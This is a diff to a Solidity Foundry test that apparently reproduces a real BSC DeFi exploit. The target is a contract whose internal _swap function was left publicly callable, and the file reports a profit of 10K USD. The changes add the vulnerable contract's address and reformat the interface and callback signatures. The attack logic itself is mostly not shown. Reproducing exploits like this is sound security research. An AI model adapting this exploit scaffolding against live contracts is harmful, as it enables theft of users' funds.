@@ -7,7 +7,7 @@ import "./../interface.sol";
 // Attacker : https://bscscan.com/address/0xff61Ba33Ed51322BB716EAb4137Adf985644b94d
 // Attack Contract : https://bscscan.com/address/0x0edf13f6bd033f0f267d46c6e9dff9c7190e0fa0
 // Attack Tx : https://app.blocksec.com/explorer/tx/bsc/0x9983ca8eaee9ee69629f74537eaf031272af75f1e5a7725911d8b06df17c67ca
- 
+// Vulnerable Contract : https://bscscan.com/address/0xD188492217F09D18f2B0ecE3F8948015981e961a
 // Profit : 10K USD
 // REASON : public interal call
 
@@ -25,14 +25,20 @@ struct RedeemData {
 }
 
 interface Vun {
-    function _swap(address tokenForSwap, bytes memory agg) external;
+    function _swap(
+        address tokenForSwap,
+        bytes memory agg
+    ) external;
 }
 
 interface Alp is IERC20 {
     function maxRedeem(
         address owner
     ) external returns (uint256 maxShares);
-    function redeem(uint256 shares, RedeemData calldata redeemData) external;
+    function redeem(
+        uint256 shares,
+        RedeemData calldata redeemData
+    ) external;
 }
 
 contract ContractTest is Test {
@@ -75,7 +81,12 @@ contract ContractTest is Test {
         emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
     }
 
-    function swap(uint256 a, uint256 b, address c, bytes memory d) external {}
+    function swap(
+        uint256 a,
+        uint256 b,
+        address c,
+        bytes memory d
+    ) external {}
 
     function getReserves() public view returns (uint256, uint256, uint256) {
         return (1, 1, block.timestamp);
